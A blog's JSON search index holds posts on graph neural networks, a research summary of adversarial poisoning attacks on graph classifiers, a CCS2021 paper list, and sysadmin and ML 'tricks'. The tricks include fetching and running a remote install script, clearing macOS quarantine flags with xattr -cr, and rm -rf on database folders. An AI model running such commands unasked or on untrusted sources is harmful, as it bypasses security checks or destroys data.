IdeaKey insightExperiments"
  },
  
  {
    "title": "Graph Neural Network",
    "url": "/posts/Graph_Neural_Network/",
    "categories": "",
    "tags": "Graph Neural Networks",
    "date": "2022-03-13 00:00:00 -0800",
    





    
    "snippet": "In the blog, I exploit and summary the graph neural networks and related concepts based on some online blogs, papers and the book “Deep Learing on Graphs”.At first, the motivations of graph neural ...",
    "content": "In the blog, I exploit and summary the graph neural networks and related concepts based on some online blogs, papers and the book “Deep Learing on Graphs”.At first, the motivations of graph neural networks can be described as follows:  Feature Engineering: select a small subset of the graph features that have minimal redundancy but maximal relevance to the target.          Here is an example: given a graph $\\mathcal{G}={\\mathcal{V}, \\mathcal{E}}$ where $\\mathcal{V}$ means the vertices and $\\mathcal{E}$ shows the edges. It is assumed that each vertex has a set of features $\\mathcal{F}={f_1,f_2,\\dots f_d}$ and the goal is to select $K$ features from $\\mathcal{F}$ to denote the node where $K\\ll d$.        Representation Learning: automatically learn the features based on the downstream tasks.          Basically, the goal is to train a mapping function $f:X\\rightarrow Y$ that map the node features $\\mathcal{F}$ in $R^d$ to embeddings $\\mathcal{E}$ in $R^K$.      The tasks of graph cover many fields:  Supervised Learning: most of them are based on the whole graphs.          Graph Classification: Classify the label of a set of graphs.        Semi-supervised Learning:          Inductive Learning: do not know the whole graph when training.      Tranductive Learning: know the whole graph when training.                  Transductive Node classification: Classify the label of a set of nodes.                      Unsupervised Learning:Consequently, the graph neural network have the following advantages:  They can handle graphs better than CNNs or RNNs.  They can do propagation guided by the graph structure based on edges instead of taking edges as the features of nodes.  They can learn reasoning graphs from non-structural data.0. Foundations0.0 GraphsIn the section, the concepts of graphs are introduced and defined formally.A graph is defined based on the nodes and edges: $\\mathcal{G}={\\mathcal{V}, \\mathcal{E}}$ where $\\mathcal{V}$ means the set of vertices and $\\mathcal{E}$ shows the edges.In most of the cases, the whole graph connectivity is recorded by the Adjacency Matrix $\\mathcal{A} \\in {0,1}^{N\\times N}$ where $\\mathcal{A}{i,j} = 1$ if vertice $v_i$ and $v_j$ is connected. Otherwise $\\mathcal{A}{i,j} = 0$. For each node, the degree is defined as the number of the nodes it connects.\\(d(v_i)=\\sum_{v_j \\in \\mathcal{V}}\\mathcal{1}(v_i, v_j)\\)0.0.1 CentralityCentrality is an important feature to show the node importance in a graph. There are four different types:  Degree Centrality: the number of each node degree. (Treat all neigbhours equally)  Eigenvector Centrality: the corresponding elements in the eigenvector $c_e$ of the largest eigenvalue $\\lambda$ for the adjacency matrix $A$ show the nodes’ centrality scores because $\\lambda \\cdot c_e = A \\cdot c_e$ which originates from the definition of the eigenvector centrality $c_e(v_i)=\\frac{1}{\\lambda}\\sum_{j=1}^N A_{i.j}\\cdot c_e(v_j)$. (Treat neighbours with different weights)  Katz Centrality: add the constant to the definition of the eigenvector centrality. $c_k=\\alpha A c_k+\\beta$.Betweenness Centrality: Instead of checking the neighbours, betweenness centrality counts the paths through each node. It is calculating cost because all the nodes pair should be considered to get the final score.0.0.2 Spectral Graph Theory  Laplacian Matrix: $L=D-A$ where $D$ is a diagonal degree matrix and $A$ is the adjacency matrix. As to the eigenvalues and eigenvectors of the Laplacian Matrix there are two theorems:          $L$ is nonnegative.      The number of 0 eigenvalues equals the number of the connected components in the graph.      0.0.3 Complex Graphs  Heterogeneous graphs: different types of vertices and edges.  Bipartite graphs: the vertex set can be divided into two disjoint subsets which means each edge connects two vertices from two subsets.  Multidimensional graphs: different types of edges.  Signed graphs: positive and negative edges.  Hypergraphs: replace the edges to the areas to show the connections.  dynamic graphs: the graphs are changing based on the timestamps.0.0.4 TasksNode classificationLink PredictionGraph Classifiation0.1 Deep Learning0.1.0 Deep Feedforward NetworksFeedforward Networks are the basic deep learning model which are built by a multilayer neurons. Each layer can be represented by $f^{(i)}$ and the whole model can be represented as $F(x)=f^{(n)}(f^{(n-1)}(\\cdots f^{1}(x)))$. The model starts from the input layer and then feedforward the data into the hidden layers and finally return the results from the output layer.For each neuron in the hidden layers, its function is like\\(h = \\alpha(b+\\sum_{i=1}^n w_i\\cdot x_i)\\)where $\\alpha(\\cdot)$ is the activation function, $w_i$ is the weight and $b$ is the bias.Activation Functions  Recitifer: $ReLU(z)=max{0, z}$.  Logistic sigmoid: $\\sigma(z)=\\frac{1}{1+exp(-z)}$  tanh: $tanh(z)=\\frac{2}{1+exp(-2\\cdot z)}-1=2\\cdot\\sigma(2z)-1$0.1.1 Convolutional Neural NetworkA common situation for the convolution operation is that there is a noisy signal $f(t)$ and we want to average the value at time $t$ with its nearby values by a weight function $g(c)$.The basic convolution operation can be defined as \\((f\\ast g)(t)=\\int_{\\tau=t-n}^{t+n}f(\\tau)g(t-\\tau)d\\tau\\)In the practical machine learning scenario, the convolution operation can be extended to data with high dimensions. For a two dimensional image $I$, the convolution operation can be performed with a two-dimensional kernel $K$:\\(S(i,j) = (I\\ast K)(i,j)=\\sum_{\\tau=i-n}^{i+n}\\sum_{j=\\gamma-n}^{\\gamma+n}I(\\tau, \\gamma)K(i-\\tau,j-\\gamma)\\)So basically, the convolution operation in deep learning originate from the one in signal processing with the similar physical meaning.0.1.2 Recurrent Neural NetworkThe input of the RNN is a sequence and each neuron has two outputs: $y^{(i)}$ and $h^{(i)}$.\\(h^{(i)}=\\alpha(W_{hh}\\cdot h^{(i-1)}+W_{hx}x^{(i-1)}+b_{h})\\)\\(y^{(i)}=\\alpha(W_{yh}h^{(i)}+b_y)\\)where $W$s are the matrices to perform linear transformations, $b$s are the bias terms and $\\alpha$ is the activation function.  Long Short-Term Memory: each neuron contains two states: the cell state and the hidden state.  Gated Recurrent Unit: it combines the cell state and the hidden state are merged and the forget gate and the input gate are combined as the update gate.    0.1.3 Tips    Preventing Overfitting:    Weight Regularization  Dropout  Batch NOrmalizationChapter 1: Basic ConceptsThe goal of graph neural networks is to learn a state embedding which encodes the neighborhoods’ information. The state embedding $h_v$ is used to produce an output $o_v$  such as the distribution of the predicted node label. Basically, the parametric function $f$ shared among all nodes which is called local transition function. Another parametric function $g$ produce the output of the node which is called local output function. They are defined as follows where $co[v]$ and $ne[v]$ means the edges and neighbors of node $v$.\\[\\begin{align}&amp;h_v=f(x_v,x_{co[v]},h_{ne[v]},x_{ne[v]})\\\\&amp;o_v=g(h_v,x_v)\\end{align}\\]In the matrix style, the above formulas can be presented as follows.\\[\\begin{align}&amp;H^{t+1}=F(H^t,X)\\\\&amp;O=G(H,X_N)\\end{align}\\]With the target information $t_v$ for the supervision, the loss function can be written as:\\(loss=\\Sigma_{i=1}^p(t_i-o_i)\\)where $p$ is the number of supervised nodes.Basically, there are two kinds of approaches: spectral methods and spatial methods. The former one trains on  the Laplacian eigenbasis which depends on the graph structure while the later one define convolutions directly on the graph based on spatially close neighbors.Chapter 2: Graph Convolutional Networks$K=1$ What does that mean?\\[g_\\theta\\cdot x\\approx\\theta'_0x+\\theta'_1(L-I_N)x=\\theta'_0x-\\theta'_1D^{-\\frac{1}{2}}AD^{-\\frac{1}{2}}x\\]with two free parameters $\\theta’_0$ and $\\theta’_1$.\\[Z=\\tilde D^{-\\frac{1}{2}}\\tilde A\\tilde D^{-\\frac{1}{2}}X\\Theta\\]At the very beginning, the definition and related concepts of Graph Neural Network should be clear.$D$ is degree matrix. $A$ is adjacency matrix. In a graph, the first-order derivative is defined as \\(f'_{*g}(x)=f(x)-f(y)\\) and $y$ is the neighborhood of $x$. So the Laplacian operator, the second-order derivative, is defined as \\(\\Delta_{*g}f'(x)=\\Sigma_{y\\sim x}f(x)-f(y)\\) which can be also presented as \\(L=D-A=I_N-D^{-\\frac{1}{2}}AD^{-\\frac{1}{2}}\\)Chapter 4: Graph EmbeddingGraph Embeddings are used to map nodes from a graph to a feature space with lower dimensions. The goal of designing the map function is from the answer of the two questions:1. What information should be keep?2. How to preserve the information?Several papers answered the first question:  neighborhood information:          Perozzi, Bryan, Al-Rfou, Rami, and Skiena, Steven. 2014. Deepwalk: Online learning of social representations. Pages 701–710 of: Proceedings of the 20th ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM.      Tang, Jian, Qu, Meng, Wang, Mingzhe, Zhang, Ming, Yan, Jun, et al. 2015. Line: Largescale information network embedding. Pages 1067–1077 of: Proceedings of the 24th International Conference on World Wide Web. International World Wide Web Conferences Steering Committee      Grover, Aditya, and Leskovec, Jure. 2016. node2vec: Scalable feature learning for networks. Pages 855–864 of: Proceedings of the 22nd ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM.        nodes’ structure role:          Ribeiro, Leonardo F.R., Saverese, Pedro H.P., and Figueiredo, Daniel R. 2017. struc2vec: Learning node representations from structural identity. Pages 385–394 of: Proceedings of the 23rd ACM SIGKDD International Conference on Knowledge Discovery and Data Mining. ACM        nodes’ status  community informationAs to the second question, the basic idea is to make sure the node representations can reconstruct the graphs with the information need to be preserved.4.1 Simple GraphsNode co-occurrence/Neighborhood  Random Walk  node2vec  LineStructural RoleNode StatusCommunity Structure4.2 Complex GraphsHeterogeneousBipartite GraphMultidimensional GraphSigned GraphHypergraphDynamic GraphChapter 7: Scalable Graph Neural NetworksReference:  Ma, Yao, and Jiliang Tang. Deep learning on graphs. Cambridge University Press, 2021.  "
  },
  
  {
    "title": "Adversarial attack on Graph Neural Network for Node Classification",
    "url": "/posts/Adversarial_Attacks_on_Graphs/",
    "categories": "",
    "tags": "Paper",
    "date": "2022-02-13 00:00:00 -0800",
    





    
    "snippet": "In the blog, I will discuss several papers about attack methods on Graph Convolutional Networks for Node Classification while there are also many other tasks which are deserved digging into like Co...",
    "content": "In the blog, I will discuss several papers about attack methods on Graph Convolutional Networks for Node Classification while there are also many other tasks which are deserved digging into like Community Detection, Link Prediction, etc.In the blog, I exploit the adversarial graph neural networks and related knowledge. I will summarize these attacks and defenses. There is also a useful github repo which collects related papers and code links.1. ConceptsThe definition of Graph Adversarial Attack2. AttackThe graph adversarial attack can be classified based on different prospectives.Attacker’s Ability:  Evasion Attack: Attacking happens after the GNN model is trained.  Poisoning Attack: Attacking happens during the training by adding poison data into the training set.Perturbation Type:  Modifying Feature:  Adding or Deleting Edges  Injecting NodesAdversary’s Goal:  Targeted Attack  Un-targeted AttackAdversary’s Knowledge:  White-box Attack  Black-box Attack  Gray-box Attack: the attacker has limited knowledge.1. Adversarial Attack on Graph Structured DataAuthor-Time-arXiv: Hanjun Dai etc.; ICML 2018; 1806.02371;Key Points:  Proposing a reinforcement learning based attack.RL-S2V1. A Restricted Black-box Adversarial Framework Towards Attacking Graph Embedding ModelsAuthor-Time-arXiv: Heng Chang etc.; AAAI 2020; 1908.01297;Key Points:  Proposing GF Attack, a black-box attack which constructs adversarial examples by graph filter and feature matrix.Graph Embedding Models are used to transfer a graph including vertexes, edges and other related information into a lower dimension vector space.1. Adversarial Attacks on Graph Neural Networks Via Meta LearningAuthor-Time: Daniel Zugner etc.; ICLR2019;Key Points:  Meta Learning  Poisoning Attack1.1 Problem FormulationThe paper considers semi-supervised node classification. Given a set of labeled nodes \\(\\nu_L\\subseteq\\nu\\), where they have exactly on class in \\(C=\\{c_1,c_2,\\dots,c_K\\}\\). The goal is to learn a function \\(f_\\theta\\) mapping each node \\(v\\in \\nu\\) to one of the \\(K\\) classes in \\(C\\) or in a probabilistic formulation: to the \\(K\\)-simplex. The parameters \\(\\theta\\) of the function \\(f_\\theta\\) are generally learned by minimizing a loss function \\(L_{trian}\\), e.g. cross-entropy, on the labeled training nodes with a single attributed graph \\(G\\):\\(\\theta^*=\\mathop{\\arg\\min}_\\limits{\\theta}L_{train}(f_{\\theta}(G))\\).1.2 Attack ModelGoal: The adversary’s goal is to increase the misclassification rate of a node classification algorithm after training on the data modified by his attacking algorithm.Knowledge: The adversary has no knowledge about the classification model and its trained weights. At the same time, he can observe all nodes’ attributes, the graph structure and labels of the subset \\(\\nu_L\\) and uses a surrogate model to modify these data.Capability: The adversary has several rules when attacking the graph models.  The budget constraint $\\Delta$ on the attacks: \\(\\vert\\vert A-\\hat A\\vert\\vert_0\\le\\Delta\\).  No node becomes disconnected.  The graph’s degree distribution can only marginally be modified by the attacker. All constraints and admissible perturbations on the data are denoted as \\(\\Phi(G)\\).1.3 Overall GoalPoisoning attacks can be formulated as a bilevel optimization problem:\\(\\mathop{\\min}_\\limits{\\hat G\\in\\Phi(G)}L_{atk}(f_{\\theta^*}(\\hat G))~s.t.\\theta^*=\\mathop{\\arg\\min}_\\limits{\\theta}L_{train}(f_\\theta(\\hat G))\\)\\(L_{atk}\\) is the loss function the attacker aims to optimize which aims to decrease the generalization  performance of the model on the unlabeled nodes. \\(L_{train}\\) is the loss on the training labeled nodes.The first option is to choose \\(L_{atk}=-L_{train}\\).The second option is to choose \\(L_{atk}=-L_{self}~where~L_{self}=L(\\nu_U,\\hat C_U)\\).The attacker computes the loss \\(L_{self}\\) on the unlabeled nodes by predicted labels \\(\\hat C_U\\) of the unlabeled nodes \\(\\nu_U=\\nu \\backslash \\nu_L\\) from a model training on the labeled data.1.4 Poisoning via Meta-GradientsThe essence of the attack is to treat the graph structure matrix as a hyper-parameter and compute the gradient of the attacker’s loss after training.\\[\\nabla_G^{meta}:=\\nabla_GL_{atk}(f_{\\theta^*}(G))~s.t.~\\theta^*=opt_\\theta(L_{train}(f_\\theta(G)))\\]where \\(opt(\\cdot)\\) is a differentiable optimization procedure like gradient descent and its stochastic variants.The parameters are updated as follows:\\(\\theta_{t+1}=\\theta_t-\\alpha\\nabla_{\\theta_t}L_{train}(f_{\\theta_t}(G))\\).The paper uses a two-layer graph convolutional network as the surrogate model.\\[f_\\theta(A,X)=softmax(\\hat A^2XW)\\]where \\(\\hat A=D^{-\\frac{1}{2}}\\tilde AD^{-\\frac{1}{2}},~\\tilde A=A+I\\) and \\(\\theta=\\{W\\}\\) is the set of learnable parameters.The score function is defined as follows:\\[S(u,v)=\\nabla_{a_{uv}}^{meta}\\cdot(-2\\cdot a_{uv}+1)\\]where \\(a_{uv}\\) is the entry at position \\((u,v)\\) in the adjacency matrix \\(A\\). If the edge \\(e=(i,j)\\) is inserted, \\(a_{ij}=1\\) otherwise it is deleted by setting \\(a_{ij}=0\\).They pick the perturbation \\(e'=(u',v')\\) with the highest score at a time:\\[e'=\\mathop{\\arg\\max}_\\limits{e=(u,v):M(A,e)\\in\\Phi(G)}S(u,v)\\]1.5 ApproximationThe paper also assumes \\(\\hat \\theta_t\\) is independent of \\(\\hat \\theta_{t-1}\\). They discover that the heuristic meta gradient on average has the strongest increase in the training loss.The heuristic of the meta gradient which achieves faster convergence sets the initial weights \\(\\theta_0\\) like that: \\(\\nabla_{\\theta_0}^{meta}\\approx \\sum_{t=1}^T\\nabla_{\\hat \\theta_t} L_{train}(f_{\\hat\\theta_t}(A;X))\\).After approximating based on a , the meta gradient can compute as follows.\\(\\nabla_A^{meta}\\approx \\sum_{t=1}^T\\nabla_AL_{train}(f_{\\hat\\theta_t}(A;X))\\).Besides, when considering the"
  },
  
  {
    "title": "Tricks Summary 2022",
    "url": "/posts/Tricks_Summary_2022/",
    "categories": "",
    "tags": "PhD",
    "date": "2022-01-19 00:00:00 -0800",
    





    
    "snippet": "In the blog, I will summary some tricks and new concepts I learned and hope it will be helpful for others.Tricks1. Github Large File StorageUsageReset the local commits: link2. Torch choose the fre...",
    "content": "In the blog, I will summary some tricks and new concepts I learned and hope it will be helpful for others.Tricks1. Github Large File StorageUsageReset the local commits: link2. Torch choose the free GPUimport osdef find_gpus(nums=6):    os.system('nvidia-smi -q -d Memory |grep -A4 GPU|grep Free &gt;~/.tmp_free_gpus')    # If there is no ~ in the path, return the path unchanged    with open(os.path.expanduser ('~/.tmp_free_gpus') , 'r') as lines_txt:        frees = lines_txt.readlines()        idx_freeMemory_pair = [ (idx,int(x.split()[2]))                        for idx,x in enumerate(frees) ]    idx_freeMemory_pair.sort(key=lambda my_tuple:my_tuple[1],reverse=True)    usingGPUs = [str(idx_memory_pair[0])                        for idx_memory_pair in idx_freeMemory_pair[:nums] ]    usingGPUs = ','.join(usingGPUs)    print('using GPU idx: #', usingGPUs)    return usingGPUs# os.environ['CUDA_VISIBLE_DEVICES'] = find_gpus(nums=4) # 必须在import torch前⾯os.environ['CUDA_VISIBLE_DEVICES'] = find_gpus(nums=6) # 必须在import torch前⾯import torch3. Calculate the GPU memory cost in Pythonpackage! pip install nvidia-ml-py3import nvidia_sminvidia_smi.nvmlInit()deviceCount = nvidia_smi.nvmlDeviceGetCount()for i in range(deviceCount):    handle = nvidia_smi.nvmlDeviceGetHandleByIndex(i)    info = nvidia_smi.nvmlDeviceGetMemoryInfo(handle)    print(\"Device {}: {}, Memory : ({:.2f}% free): {}(total), {} (free), {} (used)\".format(i, nvidia_smi.nvmlDeviceGetName(handle), 100*info.free/info.total, info.total, info.free, info.used))nvidia_smi.nvmlShutdown()4. Meet with the Large-Scale file error after commited on GithubBasically, we need to reset the worngly commited files and add after configuring the LFS again.# reset the commitgit reset --soft HEAD~1git filter-branch --tree-filter 'rm -rf path/to/your/file' HEADgit push5. How to download a video from URLStep 1: Get the m3u8 following the step from the link.Step 2: Use ffmpeg to download the video and save as a specific name: ffmpeg -protocol_whitelist file,http,https,tcp,tls,crypto -i \"https://&lt;url&gt;.m3u8\" -c copy video.mp4 from the link.6. Numpy softmax overflow issueSome details about it from Stanforad:Solution:def softmax(self, x):\tafter_softmax = []\tfor single_x in x:\t\tr=np.exp(single_x - np.max(single_x))\t\tp = r / np.sum(r)\t\tafter_softmax.append(p)\tafter_softmax = np.array(after_softmax)\tprint(after_softmax.shape)\treturn after_softmaxAnother solution that cause nan in the middle:def softmax(self, x):\tr=np.exp(x - np.max(x))\treturn r/r.sum(axis=1).reshape(x.shape[0], 1)7. Change current github commit timestampgit commit --amend --date=\"Wed Feb 16 14:00 2011 +0100\" --no-editgit commit --amend --date=\"now\"git commit --amend --date=\"2022-07-31T09:51:07\"The supporting link.8. How to use wandbWandb is a good tool to track the training model and logging the course.Github: link.A useful template from the video and the link:import wandbconf_dict = {\"GPU\":GPU,\t\t\t\t\"Machine\":MACHINE,\t\t\t\t\"HM_GPU\":HM_GPU,\t\t\t\t\"NVLINK\": NVLINK,}wandb.init(\tproject=f'project name',\tentity=\"author name\",\tconfig=conf_dict,\t#sync_tensorboard=True,  # see if it works ig\tname=f'{MACHINE}-{GPU}-{HM_GPU}GPU'\t)An example to build a logger for wandb: link.9. Pytorch GPU memory costUseful functions:  torch.cuda.memory_allocated()  torch.cuda.max_memory_allocated()  torch.cuda.memory_reserved()memory_allocated+memory_reserved = nvidia-smi memory costA useful discussion: link10. Ubuntu Mount external driver automatically when rebootUseful Link: https://askubuntu.com/a/165462  [IMPORTANT] sudo cp /etc/fstab /etc/fstab.old - Create a backup of the fstab file just in case something unwanted happens. If something happens, you will need a bootable (live) usb. If you do not have one, use the GUI method instead.  sudo blkid - Note the UUID of the partition you want to automount.  sudo nano /etc/fstab - Copy the following line to the end of the file, save it and reboot afterwards to check if it worked.          UUID=&lt;uuid&gt; &lt;pathtomount&gt; &lt;filesystem&gt; defaults 0 0        mkdir /my/path/tomount # to quote : “you must create the mount point before you mount the partition.” see https://help.ubuntu.com/community/Fstab11. Run an application from another Mac OSTry this command if you meet with the “App is damaged and please move it to the trash”:xattr -cr /path/to/application.app12. Install Cuda/Cudnn by condaInstall cuda 10.1: conda install -c miniconda cudatoolkit=10.1Install cudnn: conda install -c conda-forge cudnnFor Tensorflow 1: link13. g++/gcc default version update in ubuntuIf some errors like this configure: error: This libpqxx version needs at least C++17. shows, it can be fixed by commands like this: ./configure CXXFLAGS=\"-std=c++20 -O3\".Some useful links:  change the default versions of gcc/g++: link.14. How to record the time and memory cost of a script or command/usr/bin/time -v command from link15. Debug when running tensorflow 1 on 30 series Nvidia GPUslinkpip install nvidia-pyindexpip install nvidia-tensorflowSome useful links (but have not found a clear answer yet):  https://stackoverflow.com/questions/38303974/tensorflow-running-error-with-cublas  https://stackoverflow.com/questions/43990046/tensorflow-blas-gemm-launch-failed?noredirect=1&amp;lq=116. Pytorch Memory issueI met with the error RuntimeError: CUDA error: an illegal memory access was encountered when I run the pytorch code. I found that if I used the standard loss function cross entropy, it did not show the error. So far the mean reason is unclear.Some potential solutions:  decrease the batch_size  torch.cuda.empty_cache()New Concepts1. GAN2. VAE3. Diffusion ModelThe basic idea of diffusion models is build a long Markov chain and add Gaussian noise in each step gradually and reverse to train.Conclusion:Diffusion models are both analytically tractable and flexible. But they require multiple steps on a long Markov chain which make them slower even if they are still faster than GAN.4. ChaptGPTDec-20-20224.1 Three main abilities of original GPT-3:  Language Generation  In-context Learning  World knowledge4.2 What GPT-3.5 cannot do  on-the-fly overwriting the model’s belief  Formal reasoning  Retrieval from the Internetreference:  https://lilianweng.github.io/posts/2021-07-11-diffusion-models/  https://yang-song.github.io/blog/2021/score/  https://yaofu.notion.site/GPT-3-5-360081d91ec245f29029d37b54573756"
  },
  
  {
    "title": "Graph Databases and Visualization",
    "url": "/posts/Graph_Databases_and_Visualization/",
    "categories": "",
    "tags": "System",
    "date": "2021-11-06 00:00:00 -0700",
    





    
    "snippet": "Recently, I tried several graph databases and visualization tools on large-scale graphs such as Neo4j, Graph-Tool etc..In the blog, I will introduce some basic knowledge of them. At the same time, ...",
    "content": "Recently, I tried several graph databases and visualization tools on large-scale graphs such as Neo4j, Graph-Tool etc..In the blog, I will introduce some basic knowledge of them. At the same time, I record some issues and the corresponding solutions.Neo4j1. Install Neo4j on UbuntuInstallation Tutorial# list the databasesshow databses2. UsageSince I am using the community version, there are some actions such as creating a new database that are not able to take easily.2.1 How to create/delete a new database:  Create: link.  Delete: link.  Neo4j Server Config file: /etc/neo4j/neo4j.conf.  Neo4j database path: /var/lib/neo4j/# Step 1: Stop the server# Step 2:cd /var/lib/neo4j/# Step 3:# rm -rf data/databases/lanl/* data/transactions/lanl/*rm -rf data/databases/&lt;database name&gt; data/transactions/&lt;database name&gt;# Step 4: Restart the server2.2 How to count the nodes and edges number in the whole database  Solution: link# count node numberMATCH (n)RETURN count(n) as count# count edge numberMATCH ()-[r]-&gt;()RETURN count(r) as count2.3 Install APOC for Neo4j  Tutorial, APOC downloading link.2.4 Merge repulicated nodesMATCH (n1:Node),(n2:Node)WHERE n1.name = n2.name and id(n1) &lt; id(n2)WITH [n1,n2] as nsCALL apoc.refactor.mergeNodes(ns) YIELD nodeRETURN node2.5 Insert the nodes or edges if not existingMERGE (a:Node {name:1146})MERGE (b:Node {name: 2464})MERGE (a)-[r: Timestamp]-&gt;(b)2.6 Show all the nodes and edges in one graphMatch (n)-[r]-&gt;(m)Return n,r,m2.7 Display more nodes and edges:config initialNodeDisplay: 1000Issues:  When we try to login on Neo4j client, we receive the issue ServiceUnavailable: WebSocket connection failure. Due to security constraints in your web browser, the reason for the failure is not available to this Neo4j Driver. Please use your browsers development console to determine the root cause of the failure. Common reasons include the database being unavailable, using the wrong connection URL or temporary network problems. If you have enabled encryption, ensure your browser is configured to trust the certificate Neo4j is configured to use. WebSocket readyState is: 3:          The solution is to connect to localhost:7687/. And then we can login on localhost:7474/browser/ smoothly.        Trouble shooting link.3.Graph-ToolGraph-tool is a python package that can analyses the graphs and visualize large-scale graphs.It runs faster than Networkx because the core data structure and algorithms are implement in C++ instead of pure python.There are several ways to install it. But most of them are annoying by installing extra C++ packages. The easiest way is to install it by conda following the link.There are some quick tutorials and examples in the link."
  },
  
  {
    "title": "Reinstall Ubuntu on a dual-system machine",
    "url": "/posts/Reinstall_Ubuntu/",
    "categories": "",
    "tags": "PhD",
    "date": "2021-09-28 00:00:00 -0700",
    





    
    "snippet": "Recently, I need to reinstall the Ubuntu on Dell XPS 6 series. Here is the recording.I follow the tutorial to install the ubuntu without deleting other data. By the method, the data that are not in...",
    "content": "Recently, I need to reinstall the Ubuntu on Dell XPS 6 series. Here is the recording.I follow the tutorial to install the ubuntu without deleting other data. By the method, the data that are not in the same partition with the OS will be left in the disk.The basic steps are:  Create a live USB  Reinstall Ubuntu by choosing something else for installation type. link          Find the partition for OS.      Remove the partition and install the new ubuntu system on it.      Some Issues:  I met with these problems mostly because the machine I deal with has dual systems: ubuntu and windows. So after I reinstall ubuntu, I will stuck in the GRUB command line view.          How to use grub to run ubuntu: link      Solution: Change boot from UEFL to Legacy      How to change Grub Graphic UI waiting time: link        Auto mount the external disk on startup: link"
  },
  
  {
    "title": "CCS2021",
    "url": "/posts/CCS2021/",
    "categories": "",
    "tags": "Conferences",
    "date": "2021-09-10 00:00:00 -0700",
    





    
    "snippet": "Recently, the accepted papers from CCS2021’ is published here. I will summarize the related papers in the blog on machine learning. The details from website are here.Three Lectures:  Pseudo-Randomn...",
    "content": "Recently, the accepted papers from CCS2021’ is published here. I will summarize the related papers in the blog on machine learning. The details from website are here.Three Lectures:  Pseudo-Randomness and the Crystal Ball/Cynthia Dwork, Harvard University  Towards Building a Responsible Data Economy/Dawn Song, University of California, Berkeley  Are we done yet? Our journey to fight against memory-safety bugs/Taesoo Kim, Georgia Institute of Technology &amp; Samsung ResearchMachine Learning and Security 1: Attacks on Robustness  Black-box Adversarial Attacks on Commercial Speech Platforms with Minimal Information      A Hard Label Black-box Adversarial Attack Against Graph Neural Networks    Robust Adversarial Attacks Against DNN-Based Wireless Communication Systems  AI-Lancet: Locating Error-inducing Neurons to Optimize Neural NetworksMachine Learning and Security 2: Defenses for ML Robustness  Learning Security Classifiers with Verified Global Robustness Properties  On the Robustness of Domain Constraints  Cert-RNN: Towards Certifying the Robustness of Recurrent Neural Networks  TSS: Transformation-Specific Smoothing for Robustness CertificationPrivacy and Anonymity 1: Inference Attacks  Honest-but-Curious Nets: Sensitive Attributes of Private Inputs Can Be Secretly Coded into the Classifiers’ Outputs  Quantifying and Mitigating Privacy Risks of Contrastive Learning  Membership Inference Attacks Against Recommender Systems  Membership Leakage in Label-Only Exposures  When Machine Unlearning Jeopardizes Privacy1. A Hard Label Black-box Adversarial Attack Against Graph Neural NetworksAuthor:Main IdeaKey insightExperiments"
  },
  
  {
    "title": "Tricks Summary 2021",
    "url": "/posts/Tricks_Summary_2021/",
    "categories": "",
    "tags": "PhD",
    "date": "2021-09-02 00:00:00 -0700",
    





    
    "snippet": "In the blog, I will summary some tricks I learned and hope it will be helpful for others.Tensorflow1. Removes the warnings on Tensorflow v1I find two solutions while the first one remove all the wa...",
    "content": "In the blog, I will summary some tricks I learned and hope it will be helpful for others.Tensorflow1. Removes the warnings on Tensorflow v1I find two solutions while the first one remove all the warnings from the link.# Method 1import tensorflow as tftf.compat.v1.logging.set_verbosity(tf.compat.v1.logging.ERROR)# Method 2from tensorflow.python.util import deprecationdeprecation._PRINT_DEPRECATION_WARNINGS = False2. Set a reproducible environment for tensorflow, numpy and random packageslinkimport randomimport tensorflow as tfimport numpy as npSEED = 0def set_seeds(seed=SEED):    os.environ['PYTHONHASHSEED'] = str(seed)    random.seed(seed)    # tf.random.set_seed(seed)    tf.random.set_random_seed(seed)# tf.random.set_seed()    np.random.seed(seed)def set_global_determinism(seed=SEED):    set_seeds(seed=seed)    os.environ['TF_DETERMINISTIC_OPS'] = '1'    os.environ['TF_CUDNN_DETERMINISTIC'] = '1'    tf.config.threading.set_inter_op_parallelism_threads(1)3. Edit static graph in Tensorflow 1When we have a file to store the pretrained model and we want to attack it directly, we can use graph_editor to change the output or input of the pretrained model. The doc is here. And the following code is an example.tf.contrib.graph_editor.connect(sgv0, sgv1, disconnect_first=False)# Connect the outputs of sgv0 to the inputs of sgv1.inputs = tf.get_default_graph().get_tensor_by_name(\"input:0\")face_size = 160ndots = 2im = tf.placeholder(tf.float32, shape=(face_size, face_size, 3))expanded = tf.expand_dims(im, 0);dotted = tf.identity( expanded );# ge.connect(ge.sgv(dotted.op), ge.sgv(inputs.op), disconnect_first=True)ge.connect(ge.sgv(dotted), ge.sgv(inputs), disconnect_first=True)4. Exporting the model to ONNX formattutorial5. Remove Warnings each time running the codeSometimes successful NUMA node read from SysFS had negative value (-1), but there must be at least one NUMA node, so returning NUMA node zero will show up which is pretty annoying.for a in /sys/bus/pci/devices/*; do echo 0 | sudo tee -a $a/numa_node; done can be used to remove them.Python1. uninstall pip accidentallyAs a normal user, the python commands will be stored in /home/$USER/.local/bin/. But this time I remove the pip under the path. So I need to reinstall it by the following commands from the link:wget https://bootstrap.pypa.io/get-pip.pypython3 get-pip.py --user# Checkt the installed version$HOME/.local/bin/pip3 -VDocker1. install docker on ubuntu 16.04This tutorial also point out how to add a normal user to docker group so that he avoids to use sudo when using docker.2. How to Debug and check log when running docker-compose up -d# check the end of the log filedocker logs &lt;app name&gt; -ft# shut down the containersdocker-compose down# start the containersdocker-compose up -dIf the path is not writable, we need to change the volumes path in docker-compose.yml.3. some basic commandsdocker psdocker imagesdocker run -i -t &lt;image id&gt;Others1. Mac Bluetooth is not availableSolutions:  Reset the SMC: link2. How to use wget to imitate the website download?Solutions: use Chrome-&gt;View-&gt;Developer-&gt;Developer tools-&gt;Network Tab-&gt;Headers tab-&gt;Copy as cURLlink3. OneNote is stuck on loading pagePotential solutions:  right click the notebook-&gt;check sync error-&gt;sync4. Support two branches in the same machineUsed: linkgit worktree add ../foo_hotfix5. VS Code SFTP cannot save the filesUsed: Solution6. Change hostname on MacUsed: link7. Imgcat on iTerm2 cannot work on a remote serverInstall the python package: pip install --user imgcat from the link.8. Jupyter runs on the default python environment instead of the conda virtual environmentYou can check by the commands:import syssys.pathIf the virtual environment pathes are not listed here, it means the environment is the machine default environment.Basically, you can install the jupyter kernel by these commands (link):conda create -n py36 python=3.6conda activate py36conda install notebook ipykernelipython kernel install --userUseful link.python3 -m ipykernel install --user9. Add a repository to the current repository with the whole projectWe need to remove the cache of the sub repository: git rm -f --cached &lt;path to the submodule&gt;.10. How to upload overleaf project to Arxiv?  Add 